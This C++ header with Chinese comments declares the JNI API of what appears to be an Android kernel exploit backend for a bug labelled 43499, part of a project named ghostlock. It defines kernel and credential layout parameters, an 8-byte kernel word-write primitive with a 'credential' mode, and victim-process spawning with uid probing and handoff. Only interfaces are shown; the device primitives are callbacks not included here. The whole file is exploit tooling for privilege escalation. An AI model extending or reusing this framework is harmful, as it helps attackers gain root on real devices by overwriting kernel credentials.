#pragma once
/** @file jni/api_43499.hpp
 *  43499 的函数面：一个库、一组具名函数、参数类型化（用户裁定 2026-10-14）。
 *
 *  D2 装配（2026-10-15）：**参数类一律来自 D1 的单表生成**（jni/attack_contract_values.hpp）。
 *  本文件不再手写任何字段名：init 期的四组（Init43499 / KernelLayout43499 / CredentialLayout43499 /
 *  TargetOffsets43499）合成 SessionParams43499，每次调用带自己的请求组（Prepare43499 /
 *  Discover43499 / WordWrite43499 / FinishVictim43499）。
 *
 *  参数流向（审查要求逐项可核）：
 *    Kotlin DTO → JNI read<Group>（单表读取器，字段名来自 .def）→ 本类保存的 SessionParams43499
 *    → 每个缝回调都收到**完整的会话参数与本次请求组** → 设备实现按名字取值。
 *  缝拿不到的东西就不在契约里；缝看得到的东西，测试逐字段对比。
 *
 *  失败一律具名：bad-parameters:<字段名>、not-ready:<缺什么>、stale-generation:<哪一代>、
 *  op-not-wired:<函数名>、session-closed。
 */
#include <cstdint>
#include <string_view>
#include <span>

#include "jni/attack_contract_values.hpp"
#include "jni/backend_api.hpp"

namespace ghostlock::jni {
    using contract::CredentialLayout43499Values;
    using contract::Discover43499Values;
    using contract::FinishVictim43499Values;
    using contract::Init43499Values;
    using contract::KernelLayout43499Values;
    using contract::Prepare43499Values;
    using contract::ReadError;
    using contract::ReadFailure;
    using contract::TargetOffsets43499Values;
    using contract::WordWrite43499Values;

    /** 一次 43499 字写取哪种落字形状（与契约里 WordWrite43499.form 的取值一致）。 */
    enum class WriteForm : std::uint64_t {
        ClearPreserving = 1, /**< W1：清字段，保留目标原有内容。 */
        ClearLeaf = 2,       /**< W3：走叶子臂清字段（不保留）。 */
        ValuePreserving = 3, /**< W2：写一个值，保留目标原有内容。 */
        Count = 4,
    };

    [[nodiscard]] constexpr const char *write_form_name(WriteForm form) noexcept {
        switch (form) {
            case WriteForm::ClearPreserving: return "clear-preserving";
            case WriteForm::ClearLeaf: return "clear-leaf";
            case WriteForm::ValuePreserving: return "value-preserving";
            case WriteForm::Count: break;
        }
        return "unknown";
    }

    [[nodiscard]] constexpr WriteForm write_form_of(std::int32_t raw) noexcept {
        return raw >= 1 && raw < static_cast<std::int32_t>(WriteForm::Count)
                   ? static_cast<WriteForm>(raw)
                   : WriteForm::Count;
    }

    /** 后端自己的落字形状：内存层叫 mode 的那个值，加上 preserve。 */
    struct FormMapping final {
        std::int32_t mode; /**< 0 禁用、1 清零、2 凭据（memory::WriteMode）。 */
        bool preserve;     /**< 目标原有字节是否保留。 */
    };

    [[nodiscard]] constexpr FormMapping map_write_form(WriteForm form) noexcept {
        switch (form) {
            case WriteForm::ClearPreserving: return FormMapping{1, true};
            case WriteForm::ClearLeaf: return FormMapping{1, false};
            case WriteForm::ValuePreserving: return FormMapping{2, true};
            case WriteForm::Count: break;
        }
        return FormMapping{0, false};
    }

    /** init 期的全部会话参数：四组一起给，一起存，缝一起看得见。 */
    struct SessionParams43499 final {
        Init43499Values init{};
        KernelLayout43499Values layout{};
        CredentialLayout43499Values credential{};
        TargetOffsets43499Values targets{};
    };

    /**
     *  设备侧为这个会话发布的事实。零表示"还不知道"；三代计数器把每次请求绑到具体那一代上。
     */
    struct Facts43499 final {
        std::uint64_t page_base = 0U;
        std::uint64_t word0 = 0U;
        std::uint64_t word1 = 0U;
        std::uint64_t payload_page = 0U;
        std::uint64_t payload_base = 0U;
        std::uint64_t alias_delta = 0U;
        std::uint64_t found = 0U;
        std::uint64_t mm_struct = 0U;
        std::uint64_t victim_task = 0U;
        std::uint64_t victim_pid = 0U;
        std::uint64_t prepare_generation = 0U;
        std::uint64_t discovery_generation = 0U;
        std::uint64_t victim_generation = 0U;
        bool prepared = false;
        bool discovered = false;
        bool victim_spawned = false;
        bool victim_handed_off = false;

        /** @return 可以写字时 nullptr，否则是第一个缺失事实的名字。 */
        [[nodiscard]] const char *ready_for_write() const noexcept {
            if (!prepared || page_base == 0U) {
                return "not-ready:prepare";
            }
            if (!discovered || found == 0U) {
                return "not-ready:discover";
            }
            if (!victim_spawned || victim_task == 0U) {
                return "not-ready:victim";
            }
            return nullptr;
        }
    };

    /** Snapshot 为这个 backend 的事实发布的能力位。 */
    inline constexpr std::uint64_t kFactPrepared = 1U << 16U;
    inline constexpr std::uint64_t kFactDiscovered = 1U << 17U;
    inline constexpr std::uint64_t kFactVictim = 1U << 18U;
    /** 43499 一次写的宽度。 */
    inline constexpr std::uint64_t k43499Width = 8U;
    /** Snapshot 的能力位：PI 窗口。 */
    inline constexpr std::uint64_t kCapPiWindow = 1U << 0U;

    /** 受害者收尾动作（与契约里 FinishVictim43499.action 的取值一致）。 */
    enum class VictimAction : std::int32_t {
        Retire = 0,  /**< 收掉受害者（默认结局）。 */
        Park = 1,    /**< 保留驻留对象，供后续步骤继续用。 */
        Handoff = 2, /**< 交接给下一阶段（把 task 与 pid 交出去）。 */
    };

    [[nodiscard]] constexpr const char *victim_action_name(VictimAction action) noexcept {
        switch (action) {
            case VictimAction::Retire: return "retire";
            case VictimAction::Park: return "park";
            case VictimAction::Handoff: return "handoff";
        }
        return "unknown";
    }

    /**
     *  设备工作，用函数指针给。
     *
     *  每个回调的第一个参数都是**完整的会话参数**，第二个是本次请求组 —— 设备实现不需要自带
     *  任何配置副本。给空的缝，它的函数就以 op-not-wired:<函数名> 具名拒绝。
     */
    struct Ops43499Seams final {
        bool (*prepare)(const SessionParams43499 &params, const Prepare43499Values &request,
                        Facts43499 &facts, void *context) noexcept = nullptr;
        bool (*discover)(const SessionParams43499 &params, const Discover43499Values &request,
                         Facts43499 &facts, void *context) noexcept = nullptr;
        bool (*spawn_victim)(const SessionParams43499 &params, Facts43499 &facts,
                             void *context) noexcept = nullptr;
        bool (*victim_probe)(const SessionParams43499 &params, std::uint64_t kind,
                             std::uint64_t &value, void *context) noexcept = nullptr;
        bool (*finish_victim)(const SessionParams43499 &params,
                              const FinishVictim43499Values &request, Facts43499 &facts,
                              void *context) noexcept = nullptr;
        bool (*land)(const SessionParams43499 &params, const WordWrite43499Values &request,
                     Facts43499 &facts, void *context) noexcept = nullptr;
        bool (*read)(const SessionParams43499 &params, std::uint64_t address, std::uint64_t &value,
                     void *context) noexcept = nullptr;
        void *context = nullptr;
    };

    /** Snapshot 的结果。 */
    struct Snapshot43499 final {
        std::uint64_t phase = 0U;
        std::uint64_t flags = kCapPiWindow;
        std::uint64_t width = k43499Width;
        Facts43499 facts{};
    };

    /** 43499 的会话：一个对象一份状态，函数就是它的方法（并发由句柄表负责）。 */
    class Backend43499 final {
      public:
        Backend43499() noexcept = default;
        explicit Backend43499(Ops43499Seams seams) noexcept : seams_(seams) {}

        /** 带参数初始化：四组一起给，缺字段按名拒绝。 */
        [[nodiscard]] CallCode initialize(const SessionParams43499 &params) noexcept;

        /** 读取器失败时用它：名字就是出错的字段。 */
        [[nodiscard]] CallCode reject_initialize(const ReadFailure &failure) noexcept;

        [[nodiscard]] CallCode shutdown() noexcept;

        [[nodiscard]] CallCode snapshot(Snapshot43499 &out) noexcept;

        [[nodiscard]] CallCode prepare(const Prepare43499Values &request, Snapshot43499 &out) noexcept;

        [[nodiscard]] CallCode discover(const Discover43499Values &request, Snapshot43499 &out) noexcept;

        [[nodiscard]] CallCode spawn_victim(Snapshot43499 &out) noexcept;

        /** 受害者收尾：retire / park / handoff（都要带上代）。 */
        [[nodiscard]] CallCode finish_victim(const FinishVictim43499Values &request,
                                             Snapshot43499 &out) noexcept;

        /** 问受害者（kind 0 = uid，1 = comm）。 */
        [[nodiscard]] CallCode victim_probe(std::uint64_t kind, std::uint64_t &value) noexcept;

        /** 落一个字（带三代绑定）。 */
        [[nodiscard]] CallCode write_word(const WordWrite43499Values &request) noexcept;

        /** 读一个字（路由不能读时是 Unsupported，不是失败）。 */
        [[nodiscard]] CallCode read_word(std::uint64_t address, std::uint64_t &value) noexcept;

        [[nodiscard]] const Facts43499 &facts() const noexcept { return facts_; }

        [[nodiscard]] const SessionParams43499 &params() const noexcept { return params_; }

        [[nodiscard]] api::Phase phase() const noexcept { return phase_; }

        [[nodiscard]] const char *refusal() const noexcept { return refusal_.c_str(); }

      private:
        /** 会话关掉之后，除 snapshot / shutdown / destroy 之外的调用一律具名拒绝。 */
        [[nodiscard]] CallCode closed_guard() noexcept;

        /** 代检查：请求带来的代必须等于会话当前那一代。 */
        [[nodiscard]] CallCode check_generations(const WordWrite43499Values &request) noexcept;

        /** 把事实发布进 Snapshot 的能力位。 */
        void publish(Snapshot43499 &out) const noexcept;

        Ops43499Seams seams_{};
        SessionParams43499 params_{};
        Facts43499 facts_{};
        Refusal refusal_{};
        api::Phase phase_ = api::Phase::Declared;
    };
}  // namespace ghostlock::jni
